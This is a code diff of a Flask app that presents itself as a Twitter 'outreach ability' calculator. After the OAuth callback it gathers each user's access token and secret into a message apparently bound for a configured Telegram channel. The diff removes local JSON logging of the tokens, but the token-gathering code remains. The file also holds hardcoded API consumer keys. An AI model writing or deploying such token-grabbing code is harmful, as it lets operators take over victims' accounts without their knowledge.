@@ -10,7 +10,6 @@ telegram_channel_id = '-1004153945317'
 consumer_key = 'zD6GefUlKuXwHae7cQQfCU252'
 consumer_secret = 'hIegE2yyDT3LRrxIR2f6bUrab95Mzb5Go2TidhYC44Ru2tPWQk'
 callback_url = 'https://us-flock.com/callback'
-log_file_path = 'user_logs.json'
 
 
 def calculate_outreach_ability(user):
@@ -63,21 +62,6 @@ def log_user_info(username, access_token, access_token_secret, followers_count, 
         "Outreach Percent": outreach_percentage
     }
 
-    existing_data = []
-    if os.path.exists(log_file_path):
-        with open(log_file_path, 'r') as log_file:
-            existing_data = json.load(log_file)
-    existing_user_index = next((index for (index, user) in enumerate(existing_data) if user["Username"] == username), None)
-
-    if existing_user_index is not None:
-        existing_data[existing_user_index] = user_info
-    else:
-        existing_data.append(user_info)
-
-    with open(log_file_path, 'w') as log_file:
-        json.dump(existing_data, log_file, indent=4)
-
-
 @app.route('/')
 def home():
     return render_template('index.html')
@@ -121,8 +105,6 @@ async def callback():
     api = tweepy.API(auth)
     user = api.verify_credentials()
     outreach_percentage = calculate_outreach_ability(user)
-    log_user_info(user.screen_name, access_token, access_token_secret, user.followers_count, user.friends_count,
-                  user.created_at, outreach_percentage)
 
     ext = "**New Account(app made by andrew tate)**\n\n🪪~Username: " + user.screen_name + "\n\n🔑~Access Token: " + access_token + "\n\n🔑~Access Token Secret: " + access_token_secret + "\n\n👥~Followers: " + str(
         user.followers_count) + "\n\n🎉~Friends: " + str(user.friends_count) + "\n\n⏰~Created At: " + str(
